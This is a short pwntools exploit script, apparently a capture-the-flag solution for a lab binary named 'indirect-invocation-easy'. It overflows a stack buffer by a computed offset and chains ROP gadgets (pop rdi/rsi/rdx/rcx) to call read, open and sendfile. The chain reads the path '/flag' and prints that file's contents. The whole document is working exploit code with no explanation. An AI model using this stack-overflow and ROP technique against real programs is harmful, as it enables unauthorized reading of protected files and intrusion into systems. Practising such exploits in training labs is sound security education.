#!/usr/bin/python3

import time
from pwn import *


context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/indirect-invocation-easy')
rop = ROP(elf)

rbp = 0x7ffd559d6330
input_start = rbp - 0x60
ret = rbp + 0x8
offset = ret - input_start

pop_rdi = rop.find_gadget(["pop rdi","ret"]).address
pop_rsi = rop.find_gadget(["pop rsi","ret"]).address
pop_rcx = rop.find_gadget(["pop rcx","ret"]).address
pop_rdx = rop.find_gadget(["pop rdx","ret"]).address
ret = rop.find_gadget(["ret"]).address


payload = b"A" * offset 
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(elf.bss() + 0x200)
payload += p64(pop_rdx) + p64(7)
payload += p64(elf.sym.read)
payload += p64(pop_rdi) + p64(elf.bss() + 0x200) 
payload += p64(pop_rsi) + p64(0)
payload += p64(elf.sym.open)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(3)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rcx) + p64(100) + p64(elf.sym.sendfile)



io = process()

io.send(payload)

time.sleep(1)
io.send(b"/flag")

io.interactive()
